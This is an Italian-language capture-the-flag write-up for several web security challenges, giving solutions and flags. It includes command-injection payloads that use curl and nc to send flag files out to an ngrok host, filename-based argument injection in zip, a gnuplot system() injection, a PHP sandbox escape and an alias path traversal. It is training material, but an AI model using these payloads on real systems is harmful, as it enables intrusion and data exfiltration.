# Web Security
## Basic RCE
Usare ngrok, farlo partire ./ngok http 5000
Sul ping utilizzare le variabili di ambiente e scrivere:
```bash
google.com; curl${IFS}-F${IFS}'flag=@/flag.txt'${IFS}http://8ca2d7c8.ngrok.io
```
Prima di pingare far partire `nc -lvp 5000` per aprire la porta poi premere su ping, ed appare la flag su nc.

## PHPislovePHPislife
```php
}; print ${$strings{4}} ?>  // CCIT{Wh4t_Ar3_You_Do1ng_ou7_of_My_Sandb0x}
```

## Zip Zap lvl 2
Creare due file:
```bash
touch -- -T
touch -- -TT
```
Creare l'exploit, chiamato ex.sh che contiene:
```bash
#!/bin/bash
../../../../getflag | nc tcp.ngrok.io porta
```
Si avranno ora 3 file: `-T, -TT, ex.sh`
Creare un altro file:
```bash
touch "bash ex.sh"
```
Che invoca il file ad eseguirlo.

Zippare tutto con: `zip -- *`
Aprire la porta con cui si è fatto partire ngrok.
Mandare lo zip al server, dovrebbe dare internal server error, e la flag appare su nc -> `CCIT{N0t_en0ugh_Quot3s}`


## Plotty Boy
Si applica una concatenzazione di comandi separati da ';'.
```gnuplot
sin(x); system "ngrok ...".
```
nc aperto sempre sulla porta di ngrok ed appare la flag -> `CCIT{Pl0ttyb01_4_A_sin3Boy}`.


## 302Camo
Pubblicare un post, [img]ngrok ...[/img]
Tenere ngrok attivo e nc -lvp 5000 (porta con cui abbiamo startato ngrok).
Fare un curl di url -> ispezione immagine di camo -> mettere \ dopo = e & ed appare la flag `CCIT{PHP_s0met1ms_1ts_funn1}`


## Not a Bug. It's a Feature
Se si vede il sorgente la flag si trova su app.py, ma possiamo accedere solo a static dal file .conf, che è un alias.
Se faccioamo static/../app.py (cercando di retrocedere di una cartella) non va, con static../app.py appare la flag `CCIT{put_4_sl4sh_1n_th0s3_ali4s3s!}`.
